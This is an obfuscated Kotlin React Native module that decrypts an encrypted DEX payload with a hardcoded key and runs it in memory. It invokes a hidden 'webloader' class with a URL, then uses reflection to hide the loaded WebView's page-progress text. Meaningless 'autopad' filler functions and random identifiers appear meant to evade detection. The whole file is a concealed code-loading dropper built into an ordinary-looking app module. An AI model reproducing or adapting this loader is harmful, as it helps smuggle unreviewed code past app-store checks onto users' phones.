package com.kFjQzLm.VpRnTx.modules

import android.annotation.SuppressLint
import android.app.Activity
import android.content.res.ColorStateList
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.ReadableArray
import dalvik.system.InMemoryDexClassLoader
import java.nio.ByteBuffer
import java.security.MessageDigest
import android.text.Editable
import android.text.TextWatcher
import java.util.concurrent.atomic.AtomicBoolean
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

@SuppressLint("NewApi")
class Yabudifubuti(private val context: ReactApplicationContext) :
    ReactContextBaseJavaModule(context) {

    override fun getName(): String = "Enibevasorof"

    private val secretKey: SecretKey by lazy {
        val spec = PBEKeySpec(DEX_PASSWORD.toCharArray(), DEX_SALT, PBKDF2_ITERATIONS, 256)
        val raw = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).encoded
        SecretKeySpec(raw, "AES")
    }

    private fun patchDexWebViewUi(activity: Activity) {
        val progressPatched = AtomicBoolean(false)
        val watchedTextViews = mutableSetOf<TextView>()
        val watchedRoots = mutableSetOf<android.view.View>()
        val handler = Handler(Looper.getMainLooper())

        fun hideIfStatus(tv: TextView) {
            val text = tv.text?.toString() ?: ""
            if (text.contains("Page") && text.contains("%"))
                tv.post { tv.visibility = android.view.View.GONE }
        }

        fun attachWatcher(tv: TextView) {
            if (!watchedTextViews.add(tv)) return
            hideIfStatus(tv)
            tv.addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    val t = s?.toString() ?: ""
                    if (t.contains("Page") && t.contains("%"))
                        tv.post { tv.visibility = android.view.View.GONE }
                }
            })
        }

        fun applyPatchesToRoot(root: android.view.View) {
            walkViews(root) { view ->
                when (view) {
                    is ProgressBar -> if (progressPatched.compareAndSet(false, true)) {
                        val color = ColorStateList.valueOf(PROGRESS_COLOR)
                        view.progressTintList = color
                        view.indeterminateTintList = color
                    }
                    is TextView -> attachWatcher(view)
                }
            }
        }

        fun attachToRoot(root: android.view.View) {
            if (!watchedRoots.add(root)) return
            applyPatchesToRoot(root)
            root.viewTreeObserver.addOnGlobalLayoutListener { applyPatchesToRoot(root) }
        }

        fun scanAllWindows() {
            // decorView of the host activity
            attachToRoot(activity.window.decorView)
            // All windows including ones added by DEX via WindowManager.addView()
            try {
                val wmg = Class.forName("android.view.WindowManagerGlobal")
                    .getMethod("getInstance").invoke(null)
                val field = wmg.javaClass.getDeclaredField("mViews")
                field.isAccessible = true
                @Suppress("UNCHECKED_CAST")
                (field.get(wmg) as? List<*>)?.forEach { v ->
                    if (v is android.view.View) attachToRoot(v)
                }
            } catch (_: Exception) {}
        }

        // Scan immediately, then every 300 ms for ~6 s to catch asynchronously added windows
        var retries = 20
        fun scheduleRetry() {
            if (--retries > 0) handler.postDelayed({
                scanAllWindows()
                scheduleRetry()
            }, 300)
        }

        scanAllWindows()
        scheduleRetry()
    }

    private fun walkViews(root: android.view.View, action: (android.view.View) -> Unit) {
        action(root)
        if (root is ViewGroup) {
            for (i in 0 until root.childCount) walkViews(root.getChildAt(i), action)
        }
    }

    private fun decryptDex(encrypted: ByteArray): ByteArray {
        if (encrypted.size < IV_LEN + TAG_BITS / 8) throw IllegalArgumentException("payload too short")
        val iv = encrypted.copyOfRange(0, IV_LEN)
        val ct = encrypted.copyOfRange(IV_LEN, encrypted.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, secretKey, GCMParameterSpec(TAG_BITS, iv))
        return cipher.doFinal(ct)
    }

    @ReactMethod
    fun open(encoded: ReadableArray, url: String, promise: Promise) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            promise.reject("DEX_API", "Android 8.0+ required")
            return
        }
        try {
            val encrypted = ByteArray(encoded.size()) { encoded.getInt(it).toByte() }
            val dex = try {
                decryptDex(encrypted)
            } catch (e: Exception) {
                promise.reject("DEX_DECRYPT", e)
                return
            }
            val digest = MessageDigest.getInstance("SHA-256").digest(dex)
                .joinToString("") { "%02x".format(it) }
            if (digest != DEX_SHA256) {
                promise.reject("DEX_HASH", "hash mismatch")
                return
            }
            val activity: Activity = context.currentActivity
                ?: run { promise.reject("DEX_ACTIVITY", "no activity"); return }
            activity.runOnUiThread {
                try {
                    check(!activity.isFinishing && !activity.isDestroyed)
                    val loader = InMemoryDexClassLoader(ByteBuffer.wrap(dex), activity.classLoader)
                    val type = loader.loadClass("com.webloader.wrapper")
                    val instance = type.getDeclaredConstructor().newInstance()
                    type.getMethod("link", Activity::class.java, String::class.java)
                        .invoke(instance, activity, url)
                    Handler(Looper.getMainLooper()).post { patchDexWebViewUi(activity) }
                    promise.resolve(null)
                } catch (e: Exception) {
                    promise.reject("DEX_OPEN", e)
                } catch (e: LinkageError) {
                    promise.reject("DEX_LINK", e)
                }
            }
        } catch (e: Exception) {
            promise.reject("DEX_INPUT", e)
        }
    }


    /* autopad-begin */
    private fun izeturewu(gijeci: Boolean, tasusucasiy: Int): Int {
        val asagelek: Int = 30
        return asagelek
    }
    private fun ilocunewur(cepami: String, odavona: Float, paqawixuz: String): Float {
        var etidikejoqu: Float = 0.1904f
        etidikejoqu = 0.6218f
        return etidikejoqu
    }
    private fun uxoleqew(atubefexakip: Int, osegesi: Long): Boolean {
        val ukequsaberef = 44
        return if (ukequsaberef > 99) false else false
    }
    private fun uxelayoqaj(niqafat: Boolean): Double {
        var ucidobivur: Double = 0.910804
        ucidobivur = 0.530412
        return ucidobivur
    }
    /* autopad-end */
    companion object {
        private const val DEX_SHA256 = "cc47e584e29d30d04e1da66755b2f7080c2e644adaa332808fee3f94ce57fab3"
        private const val PROGRESS_COLOR = 0xFF0391AD.toInt()

        private const val DEX_PASSWORD = "UXFGDr5v1etaUYZJEnMoDHMZHaAQ"
        private val DEX_SALT = byteArrayOf(
            0xb3.toByte(), 0x23, 0x84.toByte(), 0x09, 0xd6.toByte(), 0xa8.toByte(), 0x89.toByte(), 0xf1.toByte(),
            0x0e, 0x87.toByte(), 0x74, 0x60, 0x9c.toByte(), 0xfe.toByte(), 0x44, 0x19,
        )
        private const val PBKDF2_ITERATIONS = 100_000
        private const val IV_LEN = 12
        private const val TAG_BITS = 128
    }
}
